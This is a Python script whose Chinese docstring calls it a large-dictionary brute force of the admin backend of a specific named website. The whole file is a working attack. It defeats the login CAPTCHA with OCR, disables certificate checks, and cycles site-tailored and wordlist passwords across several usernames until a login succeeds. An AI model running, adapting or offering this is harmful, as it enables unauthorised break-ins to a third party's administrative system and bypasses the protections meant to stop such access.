#!/usr/bin/env python3
"""1mmed.com 大字典爆破(后台)"""
import urllib.request, http.cookiejar, ssl, sys, time
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://1mmed.com"
ocr = ddddocr.DdddOcr(show_ad=False)

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    op.addheaders = [("User-Agent","Mozilla/5.0")]
    return op

def try_login(user, pw, max_attempts=8):
    op = new_opener()
    try:
        op.open(f"{B}/admin.php", timeout=6).read()
    except Exception:
        return "CONN_ERR"
    for i in range(max_attempts):
        try:
            cap = op.open(f"{B}/admin.php/Code/index", timeout=6).read()
            code = ocr.classification(cap)
        except Exception:
            continue
        if len(code) < 4: continue
        try:
            r = op.open(urllib.request.Request(f"{B}/admin.php", data=f"username={user}&pwd={pw}&code={code}&TenantId=".encode()), timeout=6)
            url = r.geturl()
            body = r.read().decode("utf-8","ignore")
            if "Login" not in url and "login" not in url:
                return "SUCCESS"
            if "验证码错误" in body:
                continue
            return "AUTH_WRONG"
        except Exception:
            continue
    return "VERIFY_FAIL"

# 大字典
pwds = []
with open("/tmp/sl_pass.txt") as f:
    pwds = [l.strip() for l in f if l.strip()]
extra = ["admin123","123456","admin888","Admin888","Admin@123","yimu123","yimu888",
         "1mmed123","shanghai123","medical123","yimu@123","admin!@#","admin#123",
         "admin2024","admin2025","admin2026","yimu2020","yimu2021","yimu2022",
         "yimu2023","yimu2024","yimu2025","yimu2026","1mmed2024","1mmed2025","1mmed2026"]
pwds = extra + pwds

for u in ["admin", "admin888", "1mmed", "yimu", "root", "test"]:
    print(f"=== {u} ({len(pwds)} pwds) ===", flush=True)
    for pw in pwds:
        r = try_login(u, pw)
        if r == "SUCCESS":
            print(f"!!!!! {u}/{pw} 登录成功!", flush=True)
            sys.exit(0)
        if r == "VERIFY_FAIL":
            print(f"  {u}/{pw}: verify fail", flush=True)
            break
        time.sleep(0.08)
print("DONE", flush=True)
